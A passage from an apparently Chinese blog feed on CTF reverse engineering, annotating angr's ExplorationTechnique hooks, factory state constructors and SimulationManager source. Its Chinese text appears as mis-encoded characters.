class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ExplorationTechnique</span>:<br><br>    <span class="hljs-comment"># ä¸»è¦hookå‡½æ•°</span><br>    _hook_list = (<span class="hljs-string">&quot;step&quot;</span>, <span class="hljs-string">&quot;filter&quot;</span>, <span class="hljs-string">&quot;selector&quot;</span>, <span class="hljs-string">&quot;step_state&quot;</span>, <span class="hljs-string">&quot;successors&quot;</span>)<br><br>    <span class="hljs-comment"># å¾—åˆ°è¢«é‡å†™çš„hookå‡½æ•°</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_get_hooks</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> &#123;name: <span class="hljs-built_in">getattr</span>(self, name) <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> self._hook_list <span class="hljs-keyword">if</span> self._is_overriden(name)&#125;<br>    <br><span class="hljs-comment"># åˆ¤æ–­å“ªäº›å‡½æ•°è¢«é‡å†™</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_is_overriden</span>(<span class="hljs-params">self, name</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(self, name).__code__ <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">getattr</span>(ExplorationTechnique, name).__code__<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">hasattr</span>(self, <span class="hljs-string">&quot;project&quot;</span>):<br>            self.project: angr.project.Project = <span class="hljs-literal">None</span><br><br><span class="hljs-comment"># è¿™ç¡®å®å°±æ˜¯ä¸€ä¸ªç©ºå‡½æ•°ï¼Œä¸“é—¨æä¾›ç»™ä½¿ç”¨è€…æ¥åˆå§‹åŒ–è‡ªå·±æ‰€è¦çš„</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setup</span>(<span class="hljs-params">self, simgr</span>):<br>        <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">step</span>(<span class="hljs-params">self, simgr, stash=<span class="hljs-string">&quot;active&quot;</span>, **kwargs</span>): <br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">         ç”¨æ¥hook stepå‡½æ•°ï¼Œæœ€ååº”è¯¥è°ƒç”¨simgr.stepä»¥ä¾¿çœŸæ­£æ‰§è¡Œ</span><br><span class="hljs-string">         åŸæœ¬çš„stepæ˜¯å¾€ä¸‹æ‰§è¡Œä¸€æ­¥ï¼Œå»åˆ°åç»§block</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        simgr.step(stash=stash, **kwargs)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter</span>(<span class="hljs-params">self, simgr, state, **kwargs</span>):  <br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">          å†³å®šè¯¥stateè¦è¢«ç§»å»å“ªä¸€ä¸ªstash</span><br><span class="hljs-string">          </span><br><span class="hljs-string">          å¦‚æœè¯´è¿™ä¸ªstateè¦è¢«filterçš„è¯ï¼Œå°±æŠŠè¿™ä¸ªstateè¦è¢«ç§»å»çš„stashåå­—è¿”å›</span><br><span class="hljs-string">          å¦‚æœæƒ³åœ¨filterä¹‹å‰å¯¹stateåšä¸€äº›æ”¹å˜ï¼Œå°±è¿”å›ä¸€ä¸ªstashçš„å…ƒç»„ï¼Œå¹¶ä¿®æ”¹state</span><br><span class="hljs-string">          </span><br><span class="hljs-string">          è¿™å’Œstepé‡Œçš„filter_funèµ·åˆ°çš„ä½œç”¨ä¸€æ ·çš„</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> simgr.<span class="hljs-built_in">filter</span>(state, **kwargs)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">selector</span>(<span class="hljs-params">self, simgr, state, **kwargs</span>):  <br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        å†³å®šè¯¥stateæ˜¯å¦è¦å‚ä¸è¿›è¿™ä¸ªstep roundï¼Œä¹Ÿå°±æ˜¯å¦‚æœè¿™ä¸ªstateè¦è¿›å…¥çš„è¯ï¼Œå°±è¿”</span><br><span class="hljs-string">        å›Trueå¦åˆ™è¿”å›False</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        è¿™ä¸ªstepé‡Œçš„selector_funèµ·åˆ°çš„ä½œç”¨æ˜¯ä¸€æ ·çš„</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> simgr.selector(state, **kwargs)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">step_state</span>(<span class="hljs-params">self, simgr, state, **kwargs</span>):  <br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        å†³å®šè¯¥stateçš„successoråº”è¯¥æ”¾å»å“ªä¸ªå—ã€‚ç»“æœåº”è¯¥æ˜¯ä¸€ä¸ªstashåˆ°successoråˆ—è¡¨çš„å­—å…¸æ˜ å°„</span><br><span class="hljs-string">        å¦‚[&quot;active:[succ1,succ2]&quot;]</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        note:è¯¥å‡½æ•°çš„ä¼˜å…ˆçº§é«˜äºfilter filteræ˜¯ä½œç”¨äºå½“å‰è¿”å›çš„state</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> simgr.step_state(state, **kwargs)<br><br><br> <span class="hljs-keyword">def</span> <span class="hljs-title function_">successors</span>(<span class="hljs-params">self, simgr, state, **kwargs</span>):  <br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        åœ¨è¿›å…¥ä¸€ä¸ªstateæ—¶è°ƒç”¨ï¼Œè¿”å›ä¸€ä¸ªSimSuccssorså¯¹è±¡</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> simgr.successors(state, **kwargs)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">complete</span>(<span class="hljs-params">self, simgr</span>):  <br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        è¿”å›å½“å‰simgræ˜¯å¦åˆ°è¾¾ &quot;completed&quot; state</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        è¯¥æ–¹æ³•ä¸æ˜¯hookçš„å¯¹è±¡ï¼Œä¹Ÿä¸åº”è¯¥ç›´æ¥è°ƒç”¨æ­¤æ–¹æ³•ï¼Œè€Œæ˜¯åº”è¯¥è‡ªå·±å†³å®šè¿”å›Trueæˆ–è€…False</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p><code>setup</code> åˆå§‹åŒ–</p><p><code>step</code> hookæ­¥å…¥</p><p><code>filter</code>å†³å®šè¯¥stateæ”¾å»å“ª å³ä¸¢å»å“ª</p><p><code>selector</code> å†³å®šè¯¥stateæ˜¯å¦æ‰§è¡Œ </p><p><code>step_state</code> å†³å®šsuccessorsæ”¾å»å“ªä¸ªstash</p><p><code>successors</code> åœ¨è¿›å…¥ä¸€ä¸ªstateæ—¶è°ƒç”¨</p><p><code>complete</code> æ˜¯å¦å…¨éƒ¨å®Œæˆ</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>angr</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>angr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Factory SimManger State</title>
    <link href="/2023/05/24/Factory%20SimManger%20State/"/>
    <url>/2023/05/24/Factory%20SimManger%20State/</url>
    
    <content type="html"><![CDATA[<p><a href="https://docs.angr.io/en/latest/_modules/angr/factory.html">facntory</a> <a href="https://docs.angr.io/en/latest/_modules/angr/sim_manager.html#SimulationManager">SimManger</a> State</p><span id="more"></span><p>ä¸€èˆ¬ä½¿ç”¨angræ—¶ï¼Œéƒ½ä¼šä»¥ä»¥ä¸‹å‡ å¥å¼€å¤´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br>proj = angr.Project(<span class="hljs-string">&#x27;examples/fauxware/fauxware&#x27;</span>, auto_load_libs=<span class="hljs-literal">False</span>)<br>state = proj.factory.entry_state()<br>simgr = proj.factory.simgr(state)<br></code></pre></td></tr></table></figure><p>ç°åœ¨å°±æ¥çœ‹çœ‹<code>factory</code>éƒ½ç©¶ç«Ÿæ˜¯ä¸ªå•¥</p><p>é¦–å…ˆfactoryæ˜¯ä¸€ä¸ªç±»ï¼Œä½†æ˜¯å®ƒæ›´åƒæ˜¯ä¸€ä¸ªå·¥å…·ç±»ï¼Œå¸®åŠ©æˆ‘ä»¬å®Œæˆä¸€äº›äº‹æƒ…ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç®€å•è°ƒç”¨é‡Œé¢çš„æ–¹æ³•ã€‚æ¯”å¦‚æˆ‘ä»¬æƒ³è¦åˆå§‹åŒ–ä¸€ä¸ªå…¥å£å‡½æ•°çš„<code>state</code>,é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨<code>factory</code>é‡Œé¢çš„<code>entry_state()</code>,å°±ä¸ç”¨è‡ªå·±å†å»å…³å¿ƒé‚£ç»†èŠ‚ã€‚</p><p>ç°åœ¨å°±æ¥çœ‹çœ‹é‡Œé¢è¿˜æœ‰å“ªäº›æ–¹æ³•</p><h2 id="State"><a href="#State" class="headerlink" title="State"></a>State</h2><h3 id="blank-state-self-kwargs"><a href="#blank-state-self-kwargs" class="headerlink" title="blank_state(self, **kwargs)"></a>blank_state(self, **kwargs)</h3><p>è°ƒç”¨æ­¤æ–¹æ³•ï¼Œä¼šè¿”å›ä¸€ä¸ªå‡ ä¹æ²¡æœ‰åˆå§‹åŒ–çš„stateå¯¹è±¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">blank_state</span>(<span class="hljs-params">self,**kwargs</span>)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        Returns a mostly-uninitialized state object. All parameters are optional.</span><br><span class="hljs-string"></span><br><span class="hljs-string">        :param addr:            State å¼€å§‹çš„åœ°å€</span><br><span class="hljs-string">        :param initial_prefix:  å¦‚æœæä¾›ï¼Œæ‰€æœ‰çš„ç¬¦å·å¯„å­˜å™¨éƒ½ä¼šæœ‰ä¸€ä¸ªä»¥æ­¤ä¸ºå‰ç¼€å­—ç¬¦ä¸²çš„ç¬¦å·å€¼</span><br><span class="hljs-string">        :param fs:              A dictionary of file names with associated preset SimFile objects.</span><br><span class="hljs-string">        :param concrete_fs:     bool describing whether the host filesystem should be consulted when opening files.</span><br><span class="hljs-string">        :param chroot:          A path to use as a fake root directory, Behaves similarly to a real chroot. Used only when concrete_fs is set to True.</span><br><span class="hljs-string">        :param kwargs:          Any additional keyword args will be passed to the SimState constructor.</span><br><span class="hljs-string">        :return:                è¿”å›ä¸€ä¸ªç©º state</span><br><span class="hljs-string">        :rtype:                 è¿”å›ç±»å‹ SimState</span><br><span class="hljs-string"> &quot;&quot;&quot;</span><br> <span class="hljs-keyword">return</span> self.project.simos.state_blank<br></code></pre></td></tr></table></figure><h3 id="entry-state-self-kwargs"><a href="#entry-state-self-kwargs" class="headerlink" title="entry_state(self, **kwargs)"></a>entry_state(self, **kwargs)</h3><p>è°ƒç”¨æ­¤æ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªèµ·å§‹åœ°å€çš„<code>state</code></p><h3 id="full-init-state-self-kwargs"><a href="#full-init-state-self-kwargs" class="headerlink" title="full_init_state(self, **kwargs)"></a>full_init_state(self, **kwargs)</h3><blockquote><p><em>Very much like :meth:<code>entry_state()</code>, except that instead of starting execution at the program entry point,</em>        <em>execution begins at a special SimProcedure that plays the role of the dynamic loader, calling each of the</em>        <em>initializer functions that should be called before execution reaches the entry point.</em>         <em>It can take any of the arguments that can be provided to <code>entry_state</code>, except for <code>addr</code>.</em></p></blockquote><p>æ„æ€æ˜¯ï¼Œè¿™ä¸ªæ–¹æ³•æ‹¥æœ‰ä»¥ä¸Šçš„æ‰€æœ‰å‚æ•°é™¤äº†addrï¼Œå› ä¸ºè¿™ä¸ªæ–¹æ³•æ˜¯å…ˆäºç¬¦å·æ‰§è¡Œçš„ï¼Œå®ƒçš„ä½œç”¨æ˜¯åˆå§‹åŒ–ï¼Œè°ƒç”¨å“ªäº›æ‰€æœ‰çš„åˆå§‹åŒ–å‡½æ•°</p><h3 id="call-state-self-addr-args-kwargs"><a href="#call-state-self-addr-args-kwargs" class="headerlink" title="call_state(self, addr, *args, **kwargs)"></a>call_state(self, addr, *args, **kwargs)</h3><p>å¾ˆæ˜¾ç„¶æ˜¯ä¸€ä¸ªåˆ›å»ºcallåˆ°æŸä¸ªå‡½æ•°çš„stateï¼Œå®ƒçš„å‚æ•°</p><blockquote><p><em>Returns a state object initialized to the start of a given function, as if it were called with given parameters.</em>         </p><p><em>:param addr:            The address the state should start at instead of the entry point.</em>        </p><p><em>:param args:            Any additional positional arguments will be used as arguments to the function call.</em> </p></blockquote><p>è¿”å›ä¸€ä¸ªä»¥ç»™å®šå‡½æ•°èµ·åˆåœ°å€çš„<code>state</code>ï¼Œæ¢å¥è¯è¯´æä¾›<code>addr</code>,å®ƒå°†ä»¥æ­¤åˆ›å»ºä¸€ä¸ª<code>state</code>,è€Œä¸å†æ˜¯entry pointã€‚å®ƒä¹Ÿå¯ä»¥é€šè¿‡<code>args</code>æ¥ä¼ é€’æ‰€callçš„å‡½æ•°å‚æ•°</p><h2 id="Simulation-Manager"><a href="#Simulation-Manager" class="headerlink" title="Simulation Manager"></a>Simulation Manager</h2><h3 id="simgr-simulation-manager-self-thing-Optional-Union-List-SimState-SimState-x3D-None-kwargs"><a href="#simgr-simulation-manager-self-thing-Optional-Union-List-SimState-SimState-x3D-None-kwargs" class="headerlink" title="simgr simulation_manager( self, thing: Optional[Union[List[SimState], SimState]] &#x3D; None,**kwargs)"></a>simgr simulation_manager( self, <strong>thing</strong>: Optional[Union[List[SimState], SimState]] &#x3D; None,**kwargs)</h3><blockquote><p><em>Constructs a new simulation manager.</em>         </p><p><em>:param thing: What to put in the new SimulationManagerâ€™s active stash (either a SimState   or a list of</em>  <em>SimStates).</em> </p><p><em>:param kwargs:  Any additional keyword arguments will be passed to the SimulationManager                        constructor</em>        </p><p><em>:returns:               The new SimulationManager</em>        </p><p><em>:rtype:                 angr.sim_manager.SimulationManager</em> </p></blockquote><p>è¿™ä¸ªæ–¹æ³•ä¹Ÿå¾ˆå¸¸ç”¨ï¼Œä½†æ˜¯å®ƒä¸å†æ˜¯åˆ›å»ºå’Œè¿”å›stateå¯¹è±¡ï¼Œè€Œæ˜¯åˆ©ç”¨stateå¯¹è±¡åˆ›å»ºä¸€ä¸ªsimulation managerå¯¹è±¡å¹¶è¿”å›ã€‚å®ƒçš„å‚æ•°å°±æ˜¯æ¥å—ä¸€ä¸ªstateåˆ—è¡¨æˆ–è€…å•ç‹¬ä¸€ä¸ªstateï¼Œå¹¶æŠŠä»–ä»¬æ”¾è¿›stashçš„activeé‡Œé¢ã€‚å¦‚æœä»€ä¹ˆå‚æ•°ä¹Ÿä¸ä¼ ï¼Œé‚£ä¹ˆå®ƒå°±é»˜è®¤ä»¥entry_pointä¸ºstateåˆ›å»ºã€‚</p><p>é‚£ä¹ˆè¿™ä¸ª<code>simulation manager</code>å¯¹è±¡æ˜¯ä¸ªå•¥å‘¢ï¼Ÿ</p><h3 id="SimulationManager"><a href="#SimulationManager" class="headerlink" title="SimulationManager"></a>SimulationManager</h3><p>angråœ¨[æ–‡æ¡£](<a href="https://docs.angr.io/en/latest/_modules/angr/sim_manager.html#SimulationManager">angr.sim_manager - angr documentation</a>)é‡Œé¢è¿™æ ·è¯„è®º<em>The Simulation Manager is the future future.</em></p><p>SimulationManager ä¹Ÿæ˜¯angré‡Œé¢çš„ä¸€ä¸ªç±»ã€‚è¿™ä¸ªç±»çš„åŠŸèƒ½å°±æ˜¯å¸®åŠ©æˆ‘ä»¬æ ¹æ®stateçš„stashæ¥ç®¡ç†stateï¼Œå¯ä»¥å¾€ä¸‹stepï¼Œå¯ä»¥è¿‡æ»¤filterï¼Œä¹Ÿå¯ä»¥èåˆmergeã€‚å¯ä»¥é€šè¿‡å±æ€§å€¼æ¥ç›´æ¥è·å–stashï¼Œæ¯”å¦‚<code>.active</code>,ä¹Ÿå¯ä»¥ç”¨ä¸€äº›å‰ç¼€æ¯”å¦‚<code>mp_</code>,é‚£ä¹ˆå°±å¯ä»¥<code>mp_active</code>,åŒç†<code>one_</code>.</p><p>è¿™æ˜¯å®ƒçš„ä¸€äº›æˆå‘˜</p><blockquote><p><em>:param project:           A Project instance.</em>    </p><p><em>:type project:              angr.project.Project</em>   </p><p> <em>:param stashes:</em>           ä¸€ä¸ªå­—å…¸ç”¨äºå­˜å‚¨stash   </p><p><em>:param active_states:   Active states to seed the â€œactiveâ€ stash with.</em>    </p><p><em>:param hierarchy:</em>         ä¸€ä¸ªStateHierarchyå¯¹è±¡ï¼Œç”¨äºè¿½è¸ªstateä¹‹é—´å…³ç³»</p><p> <em>:param resilience:</em>        æ”¶é›†errorçš„é›†åˆ    </p><p><em>:param save_unsat:</em>       å¦‚æœä¸ºTrueï¼Œåˆ™ä¿ç•™unsatçš„stateï¼Œè€Œä¸æ˜¯ç›´æ¥ä¸¢æ‰ </p><p><em>:param auto_drop:</em>        å­˜æ”¾ç›´æ¥ä¸¢å¼ƒçš„stashçš„åå­—</p><p><em>:param completion_mode:</em>     æè¿°exploretion techniquesçš„å‡½æ•°</p><p> <em>:param techniques:</em> éœ€è¦é¢„å…ˆè®¾å®šexploretion techçš„åˆ—è¡¨    </p><p>â€¦â€¦</p></blockquote><p>å½“ç„¶é‡Œé¢ä¹Ÿæœ‰å¾ˆå¤šçš„æ–¹æ³•ï¼Œæœ€é‡è¦çš„æ˜¯<code>step</code> ,<code>explore</code>,<code>use_technique</code>ä¸‰ä¸ªæ–¹æ³•</p><p>çœ‹çœ‹å®ƒçš„æ„é€ å‡½æ•°ï¼Œé€šè¿‡åˆå§‹åŒ–å‡½æ•°å°±èƒ½è¿™äº›æˆå‘˜æœ‰ä¸€ä¸ªæ›´ç›´è§‚çš„äº†è§£</p><h4 id="init"><a href="#init" class="headerlink" title="__init__"></a>__init__</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"></span><br><span class="hljs-params">        self,</span><br><span class="hljs-params">        project,</span><br><span class="hljs-params">        active_states=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        stashes=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        hierarchy=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        resilience=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        save_unsat=<span class="hljs-literal">False</span>,</span><br><span class="hljs-params">        auto_drop=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        errored=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        completion_mode=<span class="hljs-built_in">any</span>,</span><br><span class="hljs-params">        techniques=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        suggestions=<span class="hljs-literal">True</span>,</span><br><span class="hljs-params">        **kwargs,</span><br><span class="hljs-params">    </span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br><br>        self._project = project<br>        self.completion_mode = completion_mode<br>        self._errored = []<br>        self._lock = PicklableLock()<br><span class="hljs-comment">#  è¿™é‡Œå°±å¯ä»¥æ”¾å…¥è‡ªå·±çš„stash</span><br>        <span class="hljs-keyword">if</span> stashes <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            stashes = self._create_integral_stashes()<br>        self._stashes: DefaultDict[<span class="hljs-built_in">str</span>, <span class="hljs-type">List</span>[<span class="hljs-string">&quot;SimState&quot;</span>]] = stashes<br>        self._hierarchy = StateHierarchy() <span class="hljs-keyword">if</span> hierarchy <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> hierarchy<br>        self._save_unsat = save_unsat<br>        self._auto_drop = &#123;<br>            SimulationManager.DROP,<br>        &#125;<br>        self._techniques = []<br><br>        <span class="hljs-keyword">if</span> resilience <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            self._resilience = (AngrError, SimError, claripy.ClaripyError)<br>        <span class="hljs-keyword">elif</span> resilience <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span>:<br>            self._resilience = (<br>                AngrError,<br>                SimError,<br>                claripy.ClaripyError,<br>                KeyError,<br>                IndexError,<br>                TypeError,<br>                ValueError,<br>                ArithmeticError,<br>                MemoryError,<br>            )<br>        <span class="hljs-keyword">elif</span> resilience <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span>:<br>            self._resilience = ()<br>        <span class="hljs-keyword">else</span>:<br>            self._resilience = <span class="hljs-built_in">tuple</span>(resilience)<br><br>        <span class="hljs-keyword">if</span> suggestions:<br>            self.use_technique(Suggestions())<br><br>        <span class="hljs-comment"># 8&lt;----------------- Compatibility layer -----------------</span><br><br>        <span class="hljs-keyword">if</span> auto_drop <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> kwargs.pop(<span class="hljs-string">&quot;save_unconstrained&quot;</span>, <span class="hljs-literal">True</span>):<br>            self._auto_drop |= &#123;<span class="hljs-string">&quot;unconstrained&quot;</span>&#125;<br><br>        <span class="hljs-keyword">if</span> kwargs.pop(<span class="hljs-string">&quot;veritesting&quot;</span>, <span class="hljs-literal">False</span>):<br>            self.use_technique(Veritesting(**kwargs.get(<span class="hljs-string">&quot;veritesting_options&quot;</span>, &#123;&#125;)))<br>        kwargs.pop(<span class="hljs-string">&quot;veritesting_options&quot;</span>, &#123;&#125;)<br><br>        threads = kwargs.pop(<span class="hljs-string">&quot;threads&quot;</span>, <span class="hljs-literal">None</span>)<br>        <span class="hljs-keyword">if</span> threads <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            self.use_technique(Threading(threads))<br><br>        <span class="hljs-keyword">if</span> kwargs:<br>            <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">&quot;Unexpected keyword arguments: &quot;</span> + <span class="hljs-string">&quot; &quot;</span>.join(kwargs))<br>        <span class="hljs-comment"># ------------------ Compatibility layer ----------------&gt;8</span><br><br>        <span class="hljs-keyword">if</span> auto_drop:<br>            self._auto_drop |= <span class="hljs-built_in">set</span>(auto_drop)<br><br>        <span class="hljs-keyword">if</span> errored <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            self._errored.extend(errored)<br><br>        <span class="hljs-keyword">if</span> active_states:<br>            self._store_states(<span class="hljs-string">&quot;active&quot;</span>, active_states)<br><br>        <span class="hljs-keyword">if</span> techniques:<br>            <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> techniques:<br>                self.use_technique(t)<br></code></pre></td></tr></table></figure><h4 id="step"><a href="#step" class="headerlink" title="step"></a>step</h4><p>çœ‹çœ‹å®ƒçš„å‚æ•°å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">step</span>(<span class="hljs-params"></span><br><span class="hljs-params">        self,</span><br><span class="hljs-params">        stash=<span class="hljs-string">&quot;active&quot;</span>,</span><br><span class="hljs-params">        target_stash=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        n=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        selector_func=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        step_func=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        error_list=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        successor_func=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        until=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        filter_func=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        **run_args,</span><br><span class="hljs-params">    </span>):<br>    <br></code></pre></td></tr></table></figure><blockquote><p><em>stash</em> : éœ€è¦stepçš„stashåå­—ï¼Œé»˜è®¤æ˜¯active</p><p><em>target_stash</em> :  å°†ç»“æœæ”¾å…¥å“ªä¸ªstash</p><p><em>n</em> :    å¦‚æœ<code>until</code>æ˜¯NULLçš„è¯ï¼Œé‚£ä¹ˆä¼šä¸€ç›´æ‰§è¡Œnæ­¥</p><p><em><strong>selector_fun</strong></em> : æ¥æ”¶ä¸€ä¸ªä»¥stateä¸ºå‚æ•°ã€è¿”å›ç±»å‹ä¸ºå¸ƒå°”çš„å‡½æ•°ï¼Œå¦‚æœè¿”å›ä¸ºTrueï¼Œé‚£ä¹ˆæ‰§è¡Œè¯¥                                                                                               stateï¼Œå¦åˆ™ä¿æŒåŸæ ·</p><p><em><strong>step_fun</strong></em> :   